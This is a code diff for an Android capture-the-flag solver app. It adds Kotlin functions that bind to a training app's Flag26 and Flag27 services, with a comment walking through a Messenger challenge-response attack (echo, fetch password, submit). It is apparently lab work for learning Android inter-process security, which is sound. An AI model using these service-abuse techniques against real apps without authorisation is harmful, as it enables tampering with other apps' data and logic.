@@ -472,6 +472,39 @@ class Attack(private val context: Context, private val activity: HextreeActivity
 		}
 	}
 
+	/**
+	 * FLAG 27 - Message Replies
+	 * Technique: Messenger challenge-response (echo -> password -> submit)
+	 *
+	 * Flow:
+	 * 1. Send MSG_ECHO with "echo"="give flag" - sets server-side state, no reply
+	 * 2. Send MSG_GET_PASSWORD with a non-null Parcelable obj + our replyTo -
+	 *    server generates a random password and mails it back through replyTo
+	 * 3. Our handler receives it, builds MSG_GET_FLAG with that password and its
+	 *    own throwaway replyTo, sends it back on the same serviceMessenger
+	 * 4. echo=="give flag" && password matches -> success() -> Flag27Activity shown
+	 *
+	 * Key insight: Message.obj must be a real Parcelable (not a bare Any()) to
+	 * survive cross-process marshalling, and every outgoing message needs its own
+	 * non-null replyTo - the server's sendReply() helper fires on every branch,
+	 * success or failure, and NPEs the whole service if replyTo is missing.
+	 */
+	fun flag26() {
+		val servicePath = "$packageName.services.Flag26Service"
+		val intent = Intent().apply {
+			setClassName(packageName, servicePath)
+		}
+		context.bindService(intent, Flag26Service.serviceConnection, Context.BIND_AUTO_CREATE)
+	}
+
+	fun flag27() {
+		val servicePath = "$packageName.services.Flag27Service"
+		val intent = Intent().apply {
+			setClassName(packageName, servicePath)
+		}
+		context.bindService(intent, Flag27Service.serviceConnection, Context.BIND_AUTO_CREATE)
+	}
+
 // ------------------- Content Providers Flags ------------------------//
 
 	/**
